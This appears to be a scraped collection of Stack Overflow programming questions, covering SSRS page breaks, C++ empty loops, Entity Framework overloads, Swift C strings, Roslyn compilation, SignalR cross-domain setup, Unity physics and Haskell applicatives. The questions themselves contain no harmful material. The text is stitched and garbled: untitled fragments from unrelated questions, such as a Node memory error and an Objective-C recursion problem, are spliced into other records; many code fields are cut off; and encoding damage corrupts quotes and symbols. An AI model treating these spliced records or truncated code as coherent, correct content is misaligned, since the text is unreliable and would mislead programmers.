@CONTENT:I know there's a bug with conditional visibility and page breaks with SQL 2005, but I wonder if anyone has come up with a work around. I have a table that has a conditional visibility expression, and I need a page break at the end of the table. If I set the PageBreakAtEnd property to true. It is ignored no matter what. Remove the visibility condition and it works. If I place the table inside a rectangle with the conditional visibility on the table, and the page break on the table. Same result. The page break property is ignored. If I set the rectangle with the PageBreakAtEnd property and the table with the visibility condition, then I still get a page break even when the table isn't shown. Any other ideas on what to try? I'm almost at the point where I need a separate report rather than conditional visibility :( Edit: @Josh: That has the same problems. If the second table has conditional visibility it doesn't work. If it doesn't have the visibility expression, then I get the page break all the time. @Erick: I really wanted that to be the answer but unfortunately it doesn't work. When the visibility expression evaluates to hidden, there's a big gap where the rectangles would be (which I can live with), and when it evaluates to visible, the page breaks still don't work.

@TITLE:What is my best approach to determining compiler behaviour for empty infinite loops?
@CONTENT:An infinite loop with an empty body has undefined behaviour in C++11. I don't know whether it also does in C, so let's say I'm writing embedded firmware in C++11 (I know, unlikely, but bear with me). If my main were simply a: while (true) {}
 and the rest of the device's functionality were handled by interrupts, what approaches can I take in order to discover whether my implementation makes this loop safe and meaningful? Remembering that, per the standard, an implementation is free to do whatever it wants in this case, including removing the loop entirely. Assume it's not clearly stated in the implementation's documentation, as I've never seen that. Or is this a lost cause, and I should hack a workaround? volatile unsigned int dummy = 0;

while (true) {
   // Make the loop well-defined...
   dummy++;

   // ...with a trivial operation that'll hardly ever even happen
   sleep(42*86400);
}
 I recognise that embedded developers historically don't give much thought to this kind of thing, instead assuming a more "down to earth", "common sense" approach from their compiler. But I prefer to code rigourously to standards, to avoid surprises as much as possible.
@CODE:main while (true) {} volatile unsigned int dummy = 0;

while (true) {
   // Make the loop well-defined...
   dummy++;

   // ...with a trivial operation that'll hardly ever even happen
   sleep(42*86400);

@TITLE:Weird ¡§assembly not referenced¡¨ error when trying to call a valid method overload
@CONTENT:I'm using method overloading in Assembly A: public static int GetPersonId(EntityDataContext context, string name)
{
    var id = from ... in context... where ... select ...;
    return id.First(); 
}

public static int GetPersonId(SqlConnection connection, string name)
{
    using (var context = new EntityDataContext(connection, false))
    {
        return GetPersonId(context, name);
    }
}
 When I try to call the second overload from Assembly B, VS produces the following compile-time error: The type 'System.Data.Entity.DbContext' is defined in an assembly that is not referenced. You must add a reference to assembly 'EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=...'. Assembly B references Assembly A. Entity Framework is referenced only in Assembly A as Assembly B doesn't use it. The call from Assembly B looks like this: using (SqlConnection connection = new SqlConnection(connectionString))
{
    connection.Open();                               
    var id = AssemblyA.GetPersonId(connection, name); // compiler error
    ...
}  
 What I don't understand is that the error goes away if I change the method signature in Assembly A to e.g.: public static int GetPersonId(SqlConnection connection, string name, bool empty)
 and change the call to: var id = AssemblyA.GetPersonId(connection, name, true); // no error
 Why is my code not compiling in the first case? It doesn't seem to be related to Entity Framework as the error indicates. I have always thought that C# allows method overloading where method signatures differ only in parameter types. E.g. I can run the following code without problems as expected: static void DoStuff(int a, int b) { ... }
static void DoStuff(int a, float b) { ... }

DoStuff(10, 5);
DoStuff(10, 5.0f);
 So why am I getting the error in my situation despite the apparently legal overloads? Note that from Assembly B I have no problems calling other methods that internally use EntityDataContext, the only difference is that these methods don't have overloads. Background EntityDataContext inherits EF's DbContext: public partial class EntityDataContext : DbContext
{
        public EntityDataContext() : base("name=EntityDataContext") { }

        public EntityDataContext(DbConnection connection, bool contextOwnsConnection) 
            : base(connection, contextOwnsConnection) { }

        ...
}
 I'm using .NET 4.0 with EF 6 code first to an existing database with some custom ctor overloads added.
@CODE:Assembly A public static int GetPersonId(EntityDataContext context, string name)
{
    var id = from ... in context... where ... select ...;
    return id.First(); 
}

public static int GetPersonId(SqlConnection connection, string name)
{
    using (var context = new EntityDataContext(connection, false))
    {
        return GetPersonId(context, name);
    }
} Assembly B Assembly B Assembly A Assembly A Assembly B Assembly B using (SqlConnection connection = new SqlConnection(connectionString))
{
    connection.Open();                               
    var id = AssemblyA.GetPersonId(connection, name); // compiler error
    ...
} Assembly A public static int GetPersonId(SqlConnection connection, string name, bool empty) var id = AssemblyA.GetPersonId(connection, name, true); // no error static void DoStuff(int a, int b) { ... }
static void DoStuff(int a, float b) { ... }

DoStuff(10, 5);
DoStuff(10, 5.0f); Assembly B EntityDataContext EntityDataContext DbContext public partial class EntityDataContext : DbContext
{
        public EntityDataContext() : base("name=EntityDataContext") { }

        public EntityDataContext(DbConnection connection, bool contextOwnsConnection)

 To check if that a recursion stack size problem I have ran next code with --stack-size=60000 parameter var depth = 0;

 Then I ran code which gives me FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - process out of memory with the same --stack-size=60000 parameter and haven't got Segmentation fault. So I conclude CALL_AND_RETRY_LAST has nothing common with the recursion stack size. How could I solve this problem? I believe there is enough free memory on my computer to finish this task successfully. There are similar questions on stackoverflow but none of this questions are about CALL_AND_RETRY_LAST that's why I created separate question.

@TITLE:Encrypted and secure docker containers
@CONTENT:We all know situations when you cannot go open source and freely distribute software - and I am in one of these situations. I have an app that consists of a number of binaries (compiled from C sources) and python code that wraps it all into a system. This app used to work as a cloud solution so users had access to app functions via network but no chance to touch the actual server where binaries and code are stored. Now we want to deliver the "local" version of our system. The app will be running on PCs that our users will physically own. We know that everything could be broken, but at least want to protect the app from possible copying and reverse-engineering as much as possible. I know that docker is a wonderful deployment tool so I wonder: it is possible to create encrypted docker containers where no one can see any data stored in the container's filesystem? Is there a known solution to this problem? Also, maybe there are well known solutions not based on docker?

@TITLE:UIView/CALayer: Transform triggers layoutSubviews in superview
@CONTENT:When changing some of the properties for UIView it triggers layoutSubviews in superview. I can not find any statements about this in the docs. These properties triggers layout in superview and self frame bounds These properties triggers layout in superview only transform layer.transform These properties triggers layout in self only none These properties does not trigger any layout center layer.anchorPoint layer.position alpha I find it very confusing that transform is triggering layout and that position and anchorPoint does not. Example code: https://github.com/hfossli/LayoutSubviewsInconsistency I want to know: why I am seeing this behavior if this really is inconsistency or if I'm misunderstanding some core concepts how to avoid superview to layoutSubviews every time I'm changing transform I can not find anything about this in the docs nor the header files. The problem is significant when using UIDynamics or similar.

@LINK:/questions/24418955/working-with-c-strings-in-swift-or-how-to-convert-unsafepointercchar-to-cstr
@TITLE:Working with C strings in Swift, or: How to convert UnsafePointer<CChar> to CString
@CONTENT:While playing with Standard C Library functions in Swift, I came across problems when passing C strings around. As a simple example (just to demonstrate the problem), the Standard C Library function char * strdup(const char *s1);
 is exposed to Swift as func strdup(_: CString) -> UnsafePointer<CChar>
 which means that the return value of strdup() cannot be passed to another strdup() call: let s1 : CString = "abc"
let s2 = strdup(s1) // OK, s2 is a UnsafePointer<CChar>
let s3 = strdup(s2) // error: could not find an overload for '__conversion' that accepts the supplied arguments
 My question is: How to create a Swift CString from a UnsafePointer<CChar>, so that the C string returned by one standard library function can be passed to another function? The only way that I could find is (using code from How do you convert a String to a CString in the Swift Language?): let s2a = String.fromCString(s2).bridgeToObjectiveC().UTF8String
let s3 = strdup(s2a)
 But I do not find this satisfying for two reasons: It is too complicated for a simple task. (Main reason:) The above conversions works only if the C string is a valid UTF-8 string, otherwise it fails with a runtime exception. But a C string is an arbitrary sequence of characters, delimited by a NUL character. Remarks/Background: Of course, high-level functions using high-level data structures like Swift String or Objective-C NSString are preferable. But there are BSD functions in the Standard C Library which do not have an exact counterpart in the Foundation frameworks. I came across this problem while trying to answer Accessing temp directory in Swift. Here, mkdtemp() is a BSD function for which no exact NSFileManager replacement exists (as far as I know). mkdtemp() returns a UnsafePointer<CChar> which has to be passed to the NSFileManager function stringWithFileSystemRepresentation which takes a CString argument. Update: As of Xcode 6 beta 6, this problem does not exist anymore because the mapping of C-Strings into Swift has been simplified. You can just write let s1 = "abc"      // String
let s2 = strdup(s1) // UnsafeMutablePointer<Int8>
let s3 = strdup(s2) // UnsafeMutablePointer<Int8>
let s4 = String.fromCString(s3) // String
@CODE:char * strdup(const char *s1); func strdup(_: CString) -> UnsafePointer<CChar> strdup() strdup() let s1 : CString = "abc"
let s2 = strdup(s1) // OK, s2 is a UnsafePointer<CChar>
let s3 = strdup(s2) // error: could not find an overload for '__conversion' that accepts the supplied arguments CString UnsafePointer<CChar> let s2a = String.fromCString(s2).bridgeToObjectiveC().UTF8String
let s3 = strdup(s2a) String NSString mkdtemp() NSFileManager mkdtemp() UnsafePointer<CChar> NSFileManager stringWithFileSystemRepresentation CString let s1 = "abc"      // String
let s2 = strdup(s1) // UnsafeMutablePointer<Int8>

@LINK:/questions/22974473/using-roslyn-emit-method-with-a-modulebuilder-instead-of-a-memorystream
@TITLE:Using Roslyn Emit method with a ModuleBuilder instead of a MemoryStream
@CONTENT:I was having trouble with performance when using Roslyn to compile to a dynamic assembly. Compilation was taking ~3 seconds, compared to ~300 milliseconds to compile the same code when using the CodeDom compiler. Here's a pared-down version of the code I'm using to do the compilation: var compilation = CSharpCompilation.Create(
                                      "UserPayRules.dll",
                                      syntaxTrees,
                                      assembliesToAdd);

using (var stream = new MemoryStream())
{
    stopWatch.Start();
    var result = compilation.Emit(stream);
    stopWatch.Stop();
    Debug.WriteLine("Compilation: {0}", stopWatch.ElapsedMilliseconds);
    if (!result.Success)
    {
        throw new InvalidOperationException();
    }
    var assembly = Assembly.Load(stream.GetBuffer());
}
 This answer suggests passing a ModuleBuilder object into the Emit method instead of a MemoryStream in order to speed things up. I tried to follow that pattern, like so: var compilation = CSharpCompilation.Create(
                                      "UserPayRules.dll",
                                      syntaxTrees,
                                      assembliesToAdd);

var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(
                                       new AssemblyName("ThisAssembly"),
                                       AssemblyBuilderAccess.RunAndCollect);

var moduleBuilder = assemblyBuilder.DefineDynamicModule("ThisModule");
var result = compilation.Emit(moduleBuilder);

Debug.WriteLine("Compilation: {0}", stopWatch.ElapsedMilliseconds);
if (!result.Success)
{
    throw new InvalidOperationException();
}
var assembly = Assembly.Load(stream.GetBuffer());
 But my version of Roslyn apparently doesn't have an overload of the Emit method that takes a ModuleBuilder. That version is: Id: Microsoft.CodeAnalysis Version: 0.6.4033103-beta (Prerelease) Project Information: http://msdn.microsoft.com/en-US/roslyn Obviously, this is a prerelease, so it's not strange that the api might have changed. However, My Question(s) Does anyone know why the Emit method no longer seems to have an overload that takes a ModuleBuilder? Is there another way to make this compilation faster while still using Roslyn (Roslyn offers a couple advantages over the CodeDom and Mono compilers that I'd prefer not to give up)?
@CODE:CodeDom var compilation = CSharpCompilation.Create(
                                      "UserPayRules.dll",

                                      assembliesToAdd);

using (var stream = new MemoryStream())
{
    stopWatch.Start();
    var result = compilation.Emit(stream);
    stopWatch.Stop();
    Debug.WriteLine("Compilation: {0}", stopWatch.ElapsedMilliseconds);

    }
    var assembly = Assembly.Load(stream.GetBuffer());

@LINK:/questions/22791071/angular-ui-router-can-you-change-state-without-changing-url
@TITLE:Angular ui-router: Can you change state without changing URL?
@CONTENT:The multiple nested views functionality of the ui-router is very nice - you can easily jump from one state of your app to another. Sometimes you might want to change the URL, but sometimes not. I feel like the concept of state should be separate/optional from routing. Here's a plunker that shows what I mean. This is a fork of one of the plunkers in the ui-router documentation, with 2 minor changes noted below: .state('route1', {
        url: "/route", // <---- URL IS SHARED WITH ROUTE2
        views: {
            "viewA": {
                template: "route1.viewA"
            },
            "viewB": {
                template: "route1.viewB"
            }
        }
    })
    .state('route2', {
        url: "/route", // <---- URL IS SHARED WITH ROUTE1
        views: {
            "viewA": {
                template: "route2.viewA"
            },
            "viewB": {
                template: "route2.viewB"
            }
        }
    })
 This seems to work - the URL stays the same. Again, how much redundant work is done here? Is this an approved/tested usage? It would be nice if you could omit the url from a state.. UPDATE: You can omit a url from a state. plunker Update question: Is this an approved/tested usage?
@CODE:ui-router ui-router .state('route1', {
        url: "/route", // <---- URL IS SHARED WITH ROUTE2

I've tried compiling play 2.2.2 from sources and changing akka dependency there to 2.3 but i still get the same error: [ERROR] [04/01/2014 09:42:26.105] [play-akka.actor.default-dispatcher-6] [ActorSystem(play)] Uncaught error from thread [play-akka.actor.default-dispatcher-6] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled

@TITLE:How to use StringBuilder wisely
@CONTENT:I am little confused about using StringBuilder class, first: A String object concatenation operation always creates a new object from the existing string and the new data. A StringBuilder object maintains a buffer to accommodate the concatenation of new data. New data is appended to the end of the buffer if room is available; otherwise, a new, larger buffer is allocated, data from the original buffer is copied to the new buffer, then the new data is appended to the new buffer. But where is the point of creating StringBuilder instance to avoid creating new one of String? It sounds like trading "one for one". static void Main(string[] args)
{
    String foo = "123";
    using (StringBuilder sb = new StringBuilder(foo)) // also sb isn't disposable, so there will be error
    {
        sb.Append("456");
        foo = sb.ToString();
    }

    Console.WriteLine(foo);
    Console.ReadKey();
}
 Why I shouldn't just use +=
 Edit: Ok, I know now how to reuse one instance of StringBuilder (still don't know if this is right with code standards), but this isn't worth to use with just one string, isn't it?
@CODE:StringBuilder StringBuilder String static void Main(string[] args)
{
    String foo = "123";
    using (StringBuilder sb = new StringBuilder(foo)) // also sb isn't disposable, so there will be error
    {
        sb.Append("456");
        foo = sb.ToString();
    }

    Console.WriteLine(foo);
    Console.ReadKey();
} += StringBuilder

@TITLE:How do I permanently exclude the bin and obj folders from TFS 2012 checkin?
@CONTENT:I mucked around with TFS settings and I accidentally included the bin and obj folders for TFS 2012 checkin, and even checked them in already. I don't want this because these files change often and aren't meant for inclusion. I've checked What happened to "Exclude from Source Control" in VS2012. The accepted answer doesn't work because the bin & obj folders and the DLLs inside those folders don't appear in the "Promote Candidate Changes" list, even after excluding them. The second most popular answer also doesn't work permanently. I press yes to all and it removes them from the included changes list, but when I do any action involving rebuilding, they're added to include list again. I'm looking for a permanent solution which will permanently exclude these folders and the files inside from checkin, and if possible also removes them from the TFS server.

@TITLE:Increasing screen capture speed when using Java and awt.Robot
@CONTENT:Edit: If anyone also has any other recommendations for increasing performance of screen capture please feel free to share as it might fully address my problem! Hello Fellow Developers, I'm working on some basic screen capture software for myself. As of right now I've got some proof of concept/tinkering code that uses java.awt.Robot to capture the screen as a BufferedImage. Then I do this capture for a specified amount of time and afterwards dump all of the pictures to disk. From my tests I'm getting about 17 frames per second. Trial #1 Length: 15 seconds Images Captured: 255 Trial #2 Length: 15 seconds Images Captured: 229 Obviously this isn't nearly good enough for a real screen capture application. Especially since these capture were me just selecting some text in my IDE and nothing that was graphically intensive. I have two classes right now a Main class and a "Monitor" class. The Monitor class contains the method for capturing the screen. My Main class has a loop based on time that calls the Monitor class and stores the BufferedImage it returns into an ArrayList of BufferedImages. If I modify my main class to spawn several threads that each execute that loop and also collect information about the system time of when the image was captured could I increase performance? My idea is to use a shared data structure that will automatically sort the frames based on capture time as I insert them, instead of a single loop that inserts successive images into an arraylist. Code: Monitor public class Monitor {

/**
 * Returns a BufferedImage
 * @return
 */
public BufferedImage captureScreen() {
    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
    BufferedImage capture = null;

    try {
        capture = new Robot().createScreenCapture(screenRect);
    } catch (AWTException e) {
        e.printStackTrace();
    }

    return capture;
}
}

@TITLE:Scope of AsNoTracking within LINQ query in Entity Framework
@CONTENT:When utilising the AsNoTracking method within a LINQ query in Entity Framework, should it be used against each table or the query as a whole in order to disable change tracking for the entire query? 1. Against the entire query var query = (from t1 in db.Table1
            from t2 in db.Table2.Where(o => t1.ConditionId == o.ConditionId)
            select t1).AsNoTracking()
 2. Against each table var query = (from t1 in db.Table1.AsNoTracking()
            from t2 in db.Table2.AsNoTracking().Where(o => t1.ConditionId == o.ConditionId)
            select t1)
 My intention is to disable change tracking for the entire query but don't want to use it against each table if it isn't required. MSDN refers to a query object in the documentation for this method: This method works by calling the AsNoTracking method of the underlying query object. If the underlying query object does not have a AsNoTracking method, then calling this method will do nothing.
@CODE:AsNoTracking var query = (from t1 in db.Table1
            from t2 in db.Table2.Where(o => t1.ConditionId == o.ConditionId)
            select t1).AsNoTracking() var query = (from t1 in db.Table1.AsNoTracking()

@TITLE:mysql stored procedure is slower 20 times than standard query
@CONTENT:i have 10 tables with same structure except table name. i have a sp (stored procedure) defined as following:  select * from table1 where (@param1 IS NULL OR col1=@param1)
 UNION ALL
 select * from table2 where (@param1 IS NULL OR col1=@param1)
 UNION ALL
 ...
 ...
 UNION ALL
 select * from table10 where (@param1 IS NULL OR col1=@param1)
 I am calling the sp with the following line: call mySP('test')  //it executes in 6,836s
 Then I opened a new standard query window. I just copied the query above. Then replaced @param1 with 'test'. This executed in 0,321s and is about 20 times faster than the stored procedure. I changed the parameter value repeatedly for preventing the result to be cached. But this did not change the result. The SP is about 20 times slower than the equivalent standard query. Please can you help me to figure out why this is happening ? Did anybody encounter similar issues? I am using mySQL 5.0.51 on windows server 2008 R2 64 bit. edit: I am using Navicat for test. Any idea will be helpful for me. EDIT1: I just have done some test according to Barmar's answer. At finally i have changed the sp like below with one just one row:  SELECT * FROM table1 WHERE col1=@param1 AND col2=@param2
 Then firstly i executed the standart query  SELECT * FROM table1 WHERE col1='test' AND col2='test'  //Executed in 0.020s
 After i called the my sp:  CALL MySp('test','test')    //Executed in 0.466s
 So i have changed where clause entirely but nothing changed. And i called the sp from mysql command window instead of navicat. It gave same result. I am still stuck on it. my sp ddl:  CREATE DEFINER = `myDbName`@`%`
 PROCEDURE `MySP` (param1 VARCHAR(100), param2 VARCHAR(100))
 BEGIN
    SELECT * FROM table1 WHERE col1=param1 AND col2=param2
 END
 And col1 and col2 is combined indexed. You could say that why dont you use standart query then? My software design is not proper for this. I must use stored procedure. So this problem is highly important to me. EDIT2: I have gotten query profile informations. Big difference is because of "sending data row" in SP Profile Information. Sending data part takes %99 of query execution time. I am doing test on local database server. I am not connecting from remote computer. SP Profile Informations Query Profile Informations I have tried force index statement like below in my sp. But same result.  SELECT * FROM table1 FORCE INDEX (col1_col2_combined_index) WHERE col1=@param1 AND col2=@param2
 I have changed sp like below.  EXPLAIN SELECT * FROM table1 FORCE INDEX (col1_col2_combined_index) WHERE col1=param1 AND col2=param2
 This gave this result:  id:1

However, as part of the the new implementation, I need to call the superclass's implementation from the subclass's implementation. Because it's not exposed I have to invoke the method via a call to performSelector: SEL superClassSelector = NSSelectorFromString(@"methodToInvoke");
[super performSelector:superClassSelector];
 However, in my application this results in an infinite recursive loop where the subclass's implementation is invoked every time I try to invoke the superclass's implementation. Any thoughts?

@TITLE:How can I assign/update subset of tensor shared variable in Theano?
@CONTENT:When compiling a function in theano, a shared variable(say X) can be updated by specifying updates=[(X, new_value)]. Now I am trying to update only subset of a shared variable: from theano import tensor as T
from theano import function
import numpy

X = T.shared(numpy.array([0,1,2,3,4]))
Y = T.vector()
f = function([Y], updates=[(X[2:4], Y)] # error occur:
                                        # 'update target must 
                                        # be a SharedVariable'
 The codes will raise a error "update target must be a SharedVariable", I guess that means update targets can't be non-shared variables. So is there any way to compile a function to just udpate subset of shared variables?
@CODE:theano updates=[(X, new_value)] from theano import tensor as T
from theano import function
import numpy

X = T.shared(numpy.array([0,1,2,3,4]))
Y = T.vector()
f = function([Y], updates=[(X[2:4], Y)] # error occur:

@TITLE:Cross-domain will not work with a SignalR PersistentConnection
@CONTENT:NOTE: Someone else originally asked this question but deleted it before I could post my answer. Since this question covers many issues that developers face when trying to make SignalR work cross-domain, I decided to replicate it. Plus, I had already finished writing the answer! I'm running a SignalR 1.0.1 server in an ASP.NET MVC .NET Framework 4 project. I have another ASP.NET application on a different domain (different localhost port) trying to connect via the JavaScript client. I get this when my application tries to connect: XMLHttpRequest cannot load http://localhost:31865/api/negotiate?_=1363105027533.
Origin http://localhost:64296 is not allowed by Access-Control-Allow-Origin.
 I've followed all steps to enable cross-domain support with SignalR -- what am I missing? jQuery.support.cors = true; $.connection('http://localhost:31865/api', '', false, { jsonp: true, xdomain: true }); RouteTable.Routes.MapHubs(new HubConfiguration { EnableCrossDomain = true }); RouteTable.Routes.MapConnection<ApiConnection>("/api", "api"); I also added the following to Web.config in the API project: <system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Access-Control-Allow-Origin" value="*" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
 I'm using a PersistentConnection for my SignalR server, not hubs. Any ideas?

@TITLE:ASP.Net MVC Bundles and Minification
@CONTENT:When moving from development to a production environment I have run into some problems with the way in which my javascript files are being minified. It seems that some do not minify properly, and so I have been looking around to find a way to not minify a specific bundle.     public static void RegisterBundles(BundleCollection _bundles)
    {
        _bundles.Add(new ScriptBundle("~/bundles/toNotMinify").Include(
            "~/Scripts/xxxxxx.js"

        _bundles.Add(new ScriptBundle("~/bundles/toMinify").Include(
            "~/Scripts/yyyyy.js"
            ));
        etc..
 This is the basic layout in my bundle config class. I want to find a way in which to have all of my bundles minified, apart from the first one. Is this possible? So far the only solution I have found to achieve something similar is to turn off minification globally.
@CODE:public static void RegisterBundles(BundleCollection _bundles)
    {
        _bundles.Add(new ScriptBundle("~/bundles/toNotMinify").Include(
            "~/Scripts/xxxxxx.js"

@TITLE:Why is ¡§boost::function = boost::bind(¡K)¡¨ creating 13 temporaries?
@CONTENT:I have some pretty basic test code. I have a class that just logs all operations on it. I bound it to a boost::function object like this:     void Function(const Foo&)
    {
        printf("Function invoked\n");
    }

    // ...

    boost::function<void(void)> func;
    {

        printf("\nConstructing function\n");
        func = boost::bind(&Function, f);
        printf("Construction complete\n\n");
    }
 I expect that the function object contains a copy of f. So creating at least one copy is mandatory. However, I find that I get 13 temporaries. Output is: Constructing function

 I can't use ref or cref because I do need it to make a copy of the object. Am I doing something horribly wrong? Or do I need to use a wrapper (like boost::shared_ptr) to avoid an absurd number of copies? Full code and problem demonstration can be found on Codepad.

@TITLE:Android Fatal signal 11 (SIGSEGV) at 0x00000040 (code=1) Error
@CONTENT:I am working on an android application. In which I am getting users photo images(5 images)(Using opencv2.4.2 camera with face detection) and save into my database in the server using web service. For this I am using Opencv2.4.2 face detection sample, Ksoap2 for web service. In my android emulator and device(android 4.0.4) application working fine. But When I check with another device(android 4.0.3) it throws "Unfortunately, Myapp has stopped". I have attached my log file below. I don't know what is the problem. Can you give me suggestions regarding this would be great. Log:

@CONTENT:When I try to use Jackson 2.1.1 with the following jar files (in Spring 3.2.2), jackson-core-2.1.1.jar jackson-annotations-2.1.1.jar jackson-databind-2.1.1.jar I get the following exception. java.lang.ClassNotFoundException: org.codehaus.jackson.JsonProcessingException So I think, the class JsonProcessingException is contained by the jackson-core-asl-2.1.1.jar file (I'm not quite sure though) but I cannot see this file in the download. So where to get this file to resolve that exception? jackson-all-1.9.8.jar contains necessary classes including the class org.codehaus.jackson.JsonProcessingException and JSON also works fine but I'm not sure this is perfectly compatible as I'm using classes from Jackson 2.1.1 for object mapping. Therefore I'm looking for the jackson-core-asl-2.1.1.jar file but I can't see such a JAR file. I can only see 1.x.x versions here.

@TITLE:How to collide objects with high speed in Unity
@CONTENT:I try to create game for Android and I have problem with high speed objects, they don't wanna to collide. I have Sphere with Sphere Collider and Bouncy material, and RigidBody with this param (Gravity=false, Interpolate=Interpolate, Collision Detection = Continuous Dynamic) Also I have 3 walls with Box Collider and Bouncy material. This is my code for Sphere function IncreaseBallVelocity() {
rigidbody.velocity *= 1.05;
}

function Awake () {
rigidbody.AddForce(4, 4, 0, ForceMode.Impulse);

InvokeRepeating("IncreaseBallVelocity", 2, 2);
}
 In project Settings I set: "Min Penetration For Penalty Force"=0.001, "Solver Interation Count"=50 When I play on the start it work fine (it bounces) but when speed go to high, Sphere just passes the wall. Can anyone help me? Thanks. Edited var hit : RaycastHit;

var mainGameScript : MainGame;

var particles_splash : GameObject;

function Awake () {
rigidbody.AddForce(4, 4, 0, ForceMode.Impulse);

InvokeRepeating("IncreaseBallVelocity", 2, 2);
}

function Update() {
if (rigidbody.SweepTest(transform.forward, hit, 0.5))
    Debug.Log(hit.distance + "mts distance to obstacle");
if(transform.position.y < -3) {
    mainGameScript.GameOver();
    //Application.LoadLevel("Menu");
}
}

function IncreaseBallVelocity() {
rigidbody.velocity *= 1.05;
}

function OnCollisionEnter(collision : Collision) {
Instantiate(particles_splash, transform.position, transform.rotation);
}
 EDITED added more info Fixed Timestep = 0.02 Maximum Allowed Tir = 0.333 There is no difference between running the game in editor player and on Android No. It looks OK when I set 0.01 My Paddle is Box Collider without Rigidbody, walls are the same There are all in same layer (when speed is normal it all works) value in PhysicsManager are the default (same like in image) exept "Solver Interation Co..." = 50 No. When I change speed it pass other wall I am using standard cube but I expand/shrink it to fit my screen and other objects, when I expand wall more then it's OK it bouncing No. It's simple project simple example from Video http://www.youtube.com/watch?v=edfd1HJmKPY I don't use gravity

@TITLE:How to find indexPath for tapped accessory button in tableView
@CONTENT:I've simple UITableView with one section and few rows. When user clicks cell accessory button (which is connected with detailsSegue. I want to know what cell row was it. So than I can select right object from my array and assign it to the variable from the next view. I have used delegate method tableview:accessoryButtonTappedForRowWithIndexPath: and assigned indexPath value to my private property myRow. Than in prepareForSegue:sender: method I used my self.myRow.row value to select right object from array. My problem is that these two methods seems to execute in wrong order. From the NSLog I can see that prepareForSegue:sender: method is executed first and my delegate method is changing value of self.myRow after it. So prepareForSegue:sender: method is always passing wrong object to the next view (the one that was tapped previously). Sorry for my english guys. Thanks for help in advance. -(void)tableView:(UITableView *)tableView accessoryButtonTappedForRowWithIndexPath:(NSIndexPath *)indexPath {
    self.myRow = indexPath;

@TITLE:How much is applicative really about applying, rather than ¡§combining¡¨?
@CONTENT:For an uncertainty-propagating Approximate type, I'd like to have instances for Functor through Monad. This however doesn't work because I need a vector space structure on the contained types, so it must actually be restricted versions of the classes. As there still doesn't seem to be a standard library for those (or is there? please point me. There's rmonad, but it uses * rather than Constraint as the context kind, which seems just outdated to me), I wrote my own version for the time being. It all works easy for Functor class CFunctor f where
  type CFunctorCtxt f a :: Constraint
  cfmap :: (CFunctorCtxt f a, CFunctorCtxt f b)  => (a -> b) -> f a -> f b

instance CFunctor Approximate where
  type CFunctorCtxt Approximate a = FScalarBasisSpace a
  f `cfmap` Approximate v us = Approximate v' us'
   where v' = f v
         us' = ...
 but a direct translation of Applicative, like class CFunctor f => CApplicative' f where
  type CApplicative'Ctxt f a :: Constraint
  cpure' :: (CApplicative'Ctxt f a) => a -> f a
  (#<*>#) :: ( CApplicative'Ctxt f a
             , CApplicative'Ctxt f (a->b)
             , CApplicative'Ctxt f b)        => f(a->b) -> f a -> f b
 is not possible because functions a->b do not have the necessary vector space structure* FScalarBasisSpace. What does work, however, is to change the definition of the restricted applicative class: class CFunctor f => CApplicative f where
  type CApplicativeCtxt f a :: Constraint
  cpure :: CAppFunctorCtxt f a  => a -> f a
  cliftA2 :: ( CAppFunctorCtxt f a
             , CAppFunctorCtxt f b
             , CAppFunctorCtxt f c )        => (a->b->c) -> f a -> f b -> f c
 and then defining <*># rather than cliftA2 as a free function (<*>#) = cliftA2 ($)
 instead of a method. Without the constraint, that's completely equivalent (in fact, many Applicative instances go this way anyway), but in this case it's actually better: (<*>#) still has the constraint on a->b which Approximate can't fulfill, but that doesn't hurt the applicative instance, and I can still do useful stuff like ghci> cliftA2 (\x y -> (x+y)/x^2) (3¡Ó0.2) (5¡Ó0.3)        :: Approximate Double 
0.8888888888888888 +/- 0.10301238090045711
 I reckon the situation would essentially the same for many other uses of CApplicative, for instance the Set example that's already given in the original blog post on constraint kinds. So my question: is <*> more fundamental than liftA2? Again, in the unconstrained case they're equivalent anyway. I actually have found liftA2 easier to understand, but in Haskell it's probably just more natural to think about passing "containers of functions" rather than containers of objects and some "global" operation to combine them. And <*> directly induces all the liftA£g for £g ? ?, not just liftA2; doing that from liftA2 only doesn't really work. But then, these constrained classes seem to make quite a point for liftA2. In particular, it allows CApplicative instances for all CMonads, which does not work when <*># is the base method. And I think we all agree that Applicative should always be more general than Monad. What would the category theorists say to all of this? And is there a way to get the general liftA£g without a->b needing to fulfill the associated constraint? *Linear functions of that type actually do have the vector space structure, but I definitely can't restrict myself to those.

@TITLE:In Ruby, is there a way to 'override' a constant in a subclass so that inherited methods use the new constant instead of the old?
@CONTENT:In Ruby, is there a way to 'override' a constant in a subclass in such a way that calling an inherited method from the subclass results in that method using the new constant instead of the old one? For example: class SuperClass
  CONST = "Hello, world!"
  def self.say_hello
    CONST
  end
end

class SubClass < SuperClass
  override_const :CONST, "Hello, Bob!"
end

SuperClass.say_hello # => "Hello, world!"
SubClass.say_hello   # => "Hello, Bob!"
 If not, is there perhaps a way to do something like this instead? class SuperClass
  CONST = "Hello, world!"
  def self.say_hello
    CONST
  end
end

SubClass = SuperClass.clone
SubClass.send(:remove_const, :CONST)
SubClass.const_set(:CONST, "Hello, Bob!")

SubClass.say_hello # => "Hello, Bob!"
 Note: I tried my second example out in irb, and it seems to work except that class methods can't seem to access CONST after I clone the class: irb(main):012:0> SubClass.say_hello

@TITLE:If I don't odr-use a variable, can I have multiple definitions of it across translation units?
@CONTENT:The standard seems to imply that there is no restriction on the number of definitions of a variable if it is not odr-used (¡±3.2/3): Every program shall contain exactly one definition of every non-inline function or variable that is odr-used in that program; no diagnostic required. It does say that any variable can't be defined multiple times within a translation unit (¡±3.2/1): No translation unit shall contain more than one definition of any variable, function, class type, enumeration type, or template. But I can't find a restriction for non-odr-used variables across the entire program. So why can't I compile something like the following: // other.cpp
int x;

// main.cpp
int x;
int main() {}
 Compiling and linking these files with g++ 4.6.3, I get a linker error for multiple definition of 'x'. To be honest, I expect this, but since x is not odr-used anywhere (as far as I can tell), I can't see how the standard restricts this. Or is it undefined behaviour?

@TITLE:Align multiple ggplot2 plots with grid
